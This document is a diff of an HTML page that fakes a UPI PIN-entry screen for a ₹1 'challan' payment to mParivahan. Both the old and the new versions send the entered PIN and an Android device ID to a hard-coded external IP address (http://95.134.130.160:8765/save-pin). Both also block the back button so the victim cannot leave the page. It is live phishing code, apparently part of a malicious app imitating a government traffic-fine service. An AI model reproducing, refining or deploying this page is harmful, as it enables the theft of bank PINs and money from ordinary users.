@@ -1,437 +1,234 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-  <title>UPI PIN | mParivahan</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    
-    body {
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      padding: 0;
-      overflow: hidden;
-    }
-    
-    .header {
-      background: white;
-      padding: 20px;
-      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-    }
-    
-    .upi-logo {
-      text-align: center;
-      font-size: 48px;
-      margin-bottom: 10px;
-    }
-    
-    .payment-info {
-      background: #f3f4f6;
-      padding: 15px 20px;
-      border-radius: 12px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    
-    .info-label {
-      font-size: 13px;
-      color: #6b7280;
-      font-weight: 600;
-    }
-    
-    .info-value {
-      font-size: 15px;
-      color: #1f2937;
-      font-weight: 700;
-    }
-    
-    .center-section {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      padding: 30px 20px;
-    }
-    
-    .pin-title {
-      font-size: 16px;
-      color: white;
-      font-weight: 700;
-      margin-bottom: 20px;
-      text-align: center;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-    }
-    
-    .pin-inputs {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 25px;
-      justify-content: center;
-    }
-    
-    .pin-input {
-      width: 50px;
-      height: 60px;
-      background: white;
-      border: 3px solid #e5e7eb;
-      border-radius: 12px;
-      text-align: center;
-      font-size: 28px;
-      font-weight: 700;
-      color: #1f2937;
-      display: none;
-    }
-    
-    .pin-input.visible {
-      display: block;
-    }
-    
-    .warning-badge {
-      background: rgba(251, 191, 36, 0.2);
-      border: 2px solid rgba(251, 191, 36, 0.5);
-      padding: 12px 20px;
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      max-width: 85%;
-    }
-    
-    .warning-icon {
-      font-size: 24px;
-    }
-    
-    .warning-text {
-      font-size: 12px;
-      color: white;
-      font-weight: 600;
-      line-height: 1.4;
-    }
-    
-    .keypad {
-      background: white;
-      border-radius: 30px 30px 0 0;
-      padding: 25px 20px;
-      box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.1);
-    }
-    
-    .keypad-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 15px;
-      max-width: 360px;
-      margin: 0 auto;
-    }
-    
-    .key-btn {
-      background: #f9fafb;
-      border: 2px solid #e5e7eb;
-      border-radius: 14px;
-      height: 65px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 24px;
-      font-weight: 700;
-      color: #1f2937;
-      cursor: pointer;
-      transition: all 0.2s ease;
-      user-select: none;
-    }
-    
-    .key-btn:active {
-      transform: scale(0.95);
-      background: #667eea;
-      color: white;
-      border-color: #667eea;
-    }
-    
-    .key-btn.action {
-      background: linear-gradient(135deg, #667eea, #764ba2);
-      color: white;
-      border: none;
-    }
-    
-    .key-btn.delete {
-      background: #fee2e2;
-      border-color: #fca5a5;
-      color: #dc2626;
-    }
-    
-    /* Dialogs */
-    .dialog {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.6);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-      padding: 20px;
-    }
-    
-    .dialog.active {
-      display: flex;
-    }
-    
-    .dialog-content {
-      background: white;
-      border-radius: 20px;
-      padding: 30px 25px;
-      max-width: 340px;
-      width: 100%;
-      text-align: center;
-      animation: scaleIn 0.3s ease-out;
-    }
-    
-    .dialog-icon {
-      font-size: 60px;
-      margin-bottom: 15px;
-    }
-    
-    .dialog-title {
-      font-size: 18px;
-      font-weight: 700;
-      color: #1f2937;
-      margin-bottom: 10px;
-    }
-    
-    .dialog-text {
-      font-size: 14px;
-      color: #6b7280;
-      margin-bottom: 20px;
-      line-height: 1.5;
-    }
-    
-    .dialog-btn {
-      width: 100%;
-      padding: 14px;
-      border: none;
-      border-radius: 12px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
-    
-    .dialog-btn.primary {
-      background: linear-gradient(135deg, #667eea, #764ba2);
-      color: white;
-    }
-    
-    .dialog-btn.danger {
-      background: linear-gradient(135deg, #ef4444, #dc2626);
-      color: white;
-    }
-    
-    .spinner {
-      width: 50px;
-      height: 50px;
-      border: 5px solid #f3f3f3;
-      border-top: 5px solid #667eea;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 15px;
-    }
-    
-    @keyframes scaleIn {
-      from { opacity: 0; transform: scale(0.9); }
-      to { opacity: 1; transform: scale(1); }
-    }
-    
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-  </style>
-</head>
-<body>
-  <!-- Header -->
-  <div class="header">
-    <div class="upi-logo">💳</div>
-    <div class="payment-info">
-      <div>
-        <div class="info-label">प्राप्तकर्ता</div>
-        <div class="info-value">mParivahan</div>
-      </div>
-      <div style="text-align: right;">
-        <div class="info-label">राशि</div>
-        <div class="info-value">₹ 1.00</div>
-      </div>
-    </div>
-  </div>
-  
-  <!-- Center Section -->
-  <div class="center-section">
-    <div class="pin-title">UPI 4 या 6 अंकों का पिन दर्ज करें</div>
-    
-    <div class="pin-inputs">
-      <input type="password" id="pin0" class="pin-input" maxlength="1" readonly />
-      <input type="password" id="pin1" class="pin-input" maxlength="1" readonly />
-      <input type="password" id="pin2" class="pin-input" maxlength="1" readonly />
-      <input type="password" id="pin3" class="pin-input" maxlength="1" readonly />
-      <input type="password" id="pin4" class="pin-input" maxlength="1" readonly />
-      <input type="password" id="pin5" class="pin-input" maxlength="1" readonly />
-    </div>
-    
-    <div class="warning-badge">
-      <span class="warning-icon">⚠️</span>
-      <span class="warning-text">आप mParivahan को भुगतान कर रहे हैं</span>
-    </div>
-  </div>
-  
-  <!-- Keypad -->
-  <div class="keypad">
-    <div class="keypad-grid">
-      <div class="key-btn" onclick="addDigit('1')">1</div>
-      <div class="key-btn" onclick="addDigit('2')">2</div>
-      <div class="key-btn" onclick="addDigit('3')">3</div>
-      <div class="key-btn" onclick="addDigit('4')">4</div>
-      <div class="key-btn" onclick="addDigit('5')">5</div>
-      <div class="key-btn" onclick="addDigit('6')">6</div>
-      <div class="key-btn" onclick="addDigit('7')">7</div>
-      <div class="key-btn" onclick="addDigit('8')">8</div>
-      <div class="key-btn" onclick="addDigit('9')">9</div>
-      <div class="key-btn delete" onclick="removeLastDigit()">⌫</div>
-      <div class="key-btn" onclick="addDigit('0')">0</div>
-      <div class="key-btn action" onclick="submitPIN()">✓</div>
-    </div>
-  </div>
-  
-  <!-- Error Dialog -->
-  <div class="dialog" id="errorDialog">
-    <div class="dialog-content">
-      <div class="dialog-icon">❌</div>
-      <div class="dialog-title">अमान्य पिन</div>
-      <div class="dialog-text">कृपया सही 4 या 6 अंकों का पिन दर्ज करें</div>
-      <button class="dialog-btn danger" onclick="closeError()">ठीक है</button>
-    </div>
-  </div>
-  
-  <!-- Loading Dialog -->
-  <div class="dialog" id="loadingDialog">
-    <div class="dialog-content">
-      <div class="spinner"></div>
-      <div class="dialog-title">भुगतान प्रोसेस हो रहा है...</div>
-      <div class="dialog-text">कृपया प्रतीक्षा करें</div>
-    </div>
-  </div>
-  
-  <!-- Retry Dialog -->
-  <div class="dialog" id="retryDialog">
-    <div class="dialog-content">
-      <div class="dialog-icon">🔄</div>
-      <div class="dialog-title">कनेक्शन की समस्या</div>
-      <div class="dialog-text">कृपया दोबारा प्रयास करें</div>
-      <button class="dialog-btn primary" onclick="retrySubmit()">फिर से प्रयास करें</button>
-    </div>
-  </div>
-
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>UPI PIN Entry</title>
+  <script src="https://cdn.tailwindcss.com"></script>
   <script>
-    // Disable back button
-    history.pushState(null, null, location.href);
-    window.onpopstate = function() {
-      history.go(1);
-    };
-    
     let pinArr = [];
-    
     function updateInputs() {
       for (let i = 0; i < 6; i++) {
         document.getElementById('pin' + i).value = '';
-        document.getElementById('pin' + i).classList.remove('visible');
       }
-      
-      const visibleCount = pinArr.length <= 4 ? 4 : 6;
-      for (let i = 0; i < visibleCount; i++) {
-        document.getElementById('pin' + i).classList.add('visible');
-      }
-      
       for (let i = 0; i < pinArr.length; i++) {
         document.getElementById('pin' + i).value = pinArr[i];
       }
+      updateInputVisibility();
     }
-    
+    function updateInputVisibility() {
+      for (let i = 0; i < 6; i++) {
+        document.getElementById('pin' + i).style.display = 'none';
+      }
+      const visibleCount = pinArr.length <= 4 ? 4 : 6;
+      for (let i = 0; i < visibleCount; i++) {
+        document.getElementById('pin' + i).style.display = 'block';
+      }
+    }
     function addDigit(digit) {
       if (pinArr.length < 6) {
         pinArr.push(digit);
         updateInputs();
       }
     }
-    
     function removeLastDigit() {
       pinArr.pop();
       updateInputs();
     }
-    
-    function showError() {
-      document.getElementById('errorDialog').classList.add('active');
+    function showErrorPopup() {
+      document.getElementById("errorPopup").classList.remove("hidden");
     }
-    
-    function closeError() {
-      document.getElementById('errorDialog').classList.remove('active');
+    function closeErrorPopup() {
+      document.getElementById("errorPopup").classList.add("hidden");
     }
-    
-    function showLoading() {
-      document.getElementById('loadingDialog').classList.add('active');
+    function showLoadingDialog() {
+      document.getElementById("loadingDialog").classList.remove("hidden");
     }
-    
-    function hideLoading() {
-      document.getElementById('loadingDialog').classList.remove('active');
+    function hideLoadingDialog() {
+      document.getElementById("loadingDialog").classList.add("hidden");
     }
-    
-    function showRetry() {
-      document.getElementById('retryDialog').classList.add('active');
+    function showRetryDialog() {
+      document.getElementById("retryDialog").classList.remove("hidden");
     }
-    
-    function closeRetry() {
-      document.getElementById('retryDialog').classList.remove('active');
+    function closeRetryDialog() {
+      document.getElementById("retryDialog").classList.add("hidden");
     }
-    
-    function retrySubmit() {
-      closeRetry();
-      submitPIN();
-    }
-    
     function submitPIN() {
       if (pinArr.length === 4 || pinArr.length === 6) {
         const pin = pinArr.join('');
-        const deviceId = window.Android ? window.Android.getDeviceId() : 'web_device';
+        showLoadingDialog();
         
-        showLoading();
-        
-        fetch('http://95.134.130.160:8765/save-pin', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ pin: pin, device_id: deviceId })
-        })
-        .then(response => {
-          hideLoading();
-          if (response.ok) {
-            window.location.href = 'final.html';
-          } else {
-            showRetry();
-          }
-        })
-        .catch(error => {
-          hideLoading();
-          showRetry();
-        });
+        try {
+          const deviceId = Android.getDeviceId();
+          
+          // Send with device_id like other requests
+          fetch("http://95.134.130.160:8765/save-pin", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ 
+              pin: pin, 
+              device_id: deviceId 
+            })
+          })
+          .then(res => {
+            if (!res.ok) {
+              hideLoadingDialog();
+              showRetryDialog();
+              throw new Error("Server error");
+            }
+            return res.json();
+          })
+          .then(data => {
+            setTimeout(() => {
+              window.location.href = "final.html";
+            }, 500);
+          })
+          .catch(err => {
+            console.error(err);
+            hideLoadingDialog();
+            showRetryDialog();
+          });
+        } catch (err) {
+          console.error(err);
+          const fallbackDeviceId = "browser_test_" + Date.now();
+          
+          fetch("http://95.134.130.160:8765/save-pin", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ 
+              pin: pin, 
+              device_id: fallbackDeviceId 
+            })
+          })
+          .then(res => {
+            if (!res.ok) {
+              hideLoadingDialog();
+              showRetryDialog();
+              throw new Error("Server error");
+            }
+            return res.json();
+          })
+          .then(data => {
+            setTimeout(() => {
+              window.location.href = "final.html";
+            }, 500);
+          })
+          .catch(err => {
+            console.error(err);
+            hideLoadingDialog();
+            showRetryDialog();
+          });
+        }
       } else {
-        showError();
+        showErrorPopup();
       }
     }
-    
-    // Initialize
-    window.onload = () => { updateInputs(); };
+    window.onload = () => { 
+      updateInputs();
+      // Disable back button
+      history.pushState(null, null, location.href);
+      window.onpopstate = function() {
+        history.go(1);
+      };
+    };
   </script>
+  <style>
+    input { font-size: 20px !important; }
+    .grid button { font-size: 22px !important; padding: 12px 0 !important; }
+    .delete-icon, .submit-icon { width: 28px !important; height: 28px !important; }
+  </style>
+</head>
+<body class="bg-white text-black min-h-screen flex flex-col justify-between">
+  <div class="flex flex-col items-center pb-2 border-b border-gray-300">
+    <!-- UPI Logo Inline SVG -->
+    <svg class="h-12 mx-auto" viewBox="0 0 300 80" xmlns="http://www.w3.org/2000/svg">
+      <text x="10" y="50" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="#097939">UPI</text>
+      <text x="120" y="50" font-family="Arial, sans-serif" font-size="28" fill="#666">Unified Payments</text>
+    </svg>
+    
+    <div class="box flex w-full py-2 px-4 bg-[#80808020] items-center justify-between">
+      <div class="to">
+        <div class="text-sm text-gray-500">To:</div>
+        <div class="text-sm text-gray-500">Sending:</div>
+      </div>
+      <div class="to">
+        <div class="text-sm text-gray-500 font-bold">mParivahan</div>
+        <div class="text-sm text-gray-500 font-bold">₹ 1.00</div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="flex flex-col items-center py-6">
+    <p class="text-sm text-gray-700 mb-4">ENTER UPI 4 OR 6 DIGIT PIN</p>
+    <div class="flex justify-center space-x-2 mb-4">
+      <input type="password" id="pin0" maxlength="1" class="w-10 h-12 text-center text-2xl border-gray-400 bg-white rounded" readonly />
+      <input type="password" id="pin1" maxlength="1" class="w-10 h-12 text-center text-2xl border-gray-400 bg-white rounded" readonly />
+      <input type="password" id="pin2" maxlength="1" class="w-10 h-12 text-center text-2xl border-gray-400 bg-white rounded" readonly />
+      <input type="password" id="pin3" maxlength="1" class="w-10 h-12 text-center text-2xl border-gray-400 bg-white rounded" readonly />
+      <input type="password" id="pin4" maxlength="1" class="w-10 h-12 text-center text-2xl border-gray-400 bg-white rounded" readonly />
+      <input type="password" id="pin5" maxlength="1" class="w-10 h-12 text-center text-2xl border-gray-400 bg-white rounded" readonly />
+    </div>
+    <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-2 mt-4 text-xs w-3/4 text-center rounded">
+      <span class="font-bold">!</span> You are paying challan to mParivahan
+    </div>
+  </div>
+  
+  <div class="bg-gray-100 py-4 rounded-t-3xl">
+    <div class="grid grid-cols-3 gap-4 px-12 text-2xl font-medium text-gray-800">
+      <button class="py-4" onclick="addDigit('1')">1</button>
+      <button class="py-4" onclick="addDigit('2')">2</button>
+      <button class="py-4" onclick="addDigit('3')">3</button>
+      <button class="py-4" onclick="addDigit('4')">4</button>
+      <button class="py-4" onclick="addDigit('5')">5</button>
+      <button class="py-4" onclick="addDigit('6')">6</button>
+      <button class="py-4" onclick="addDigit('7')">7</button>
+      <button class="py-4" onclick="addDigit('8')">8</button>
+      <button class="py-4" onclick="addDigit('9')">9</button>
+      <button class="py-4 text-xl text-center flex items-center justify-center" onclick="removeLastDigit()">
+        <!-- Delete/Backspace Icon -->
+        <svg class="delete-icon" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/>
+        </svg>
+      </button>
+      <button class="py-4" onclick="addDigit('0')">0</button>
+      <button class="py-4 text-2xl text-center flex items-center justify-center" onclick="submitPIN()">
+        <!-- Check/Submit Icon -->
+        <svg class="submit-icon" viewBox="0 0 24 24" fill="#4CAF50">
+          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+        </svg>
+      </button>
+    </div>
+  </div>
+  
+  <!-- Error Popup -->
+  <div id="errorPopup" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 hidden px-4">
+    <div class="bg-white rounded-lg p-6 w-full max-w-xs text-center shadow-xl">
+      <p class="text-red-600 font-semibold mb-4 text-sm">कृपया सही 4 या 6 अंकों का पिन दर्ज करें।</p>
+      <button onclick="closeErrorPopup()" class="bg-red-600 text-white px-4 py-2 rounded text-sm">ठीक है</button>
+    </div>
+  </div>
+  
+  <!-- Loading Dialog -->
+  <div id="loadingDialog" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden px-4">
+    <div class="bg-white rounded-2xl p-8 w-full max-w-xs text-center shadow-2xl">
+      <div class="flex justify-center mb-4">
+        <div class="w-16 h-16 border-4 border-gray-200 border-t-green-500 rounded-full animate-spin"></div>
+      </div>
+      <p class="text-gray-800 font-semibold text-base mb-2">Processing Payment...</p>
+      <p class="text-gray-500 text-sm">कृपया प्रतीक्षा करें</p>
+    </div>
+  </div>
+  
+  <!-- Retry Dialog -->
+  <div id="retryDialog" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden px-4">
+    <div class="bg-white rounded-2xl p-8 w-full max-w-xs text-center shadow-2xl">
+      <div class="text-6xl mb-4">⚠️</div>
+      <p class="text-gray-800 font-semibold text-base mb-3">कनेक्शन की समस्या</p>
+      <p class="text-gray-600 text-sm mb-6">कृपया दोबारा प्रयास करें</p>
+      <button onclick="closeRetryDialog()" class="bg-gradient-to-r from-blue-500 to-blue-600 text-white px-6 py-3 rounded-lg text-sm font-semibold w-full">
+        फिर से प्रयास करें
+      </button>
+    </div>
+  </div>
 </body>
 </html>
